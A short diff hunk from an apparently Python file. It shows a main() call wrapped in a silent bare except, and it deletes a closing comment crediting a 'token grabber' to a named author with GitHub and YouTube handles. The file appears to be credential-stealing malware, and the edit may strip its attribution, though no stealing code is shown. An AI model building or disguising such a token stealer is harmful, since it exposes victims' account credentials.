@@ -186,5 +186,3 @@ try:
     main()
 except:
     pass
-
-# Token grabber coded by Venax, Github : venaxyt / YouTube : youtube.com/VENAX59
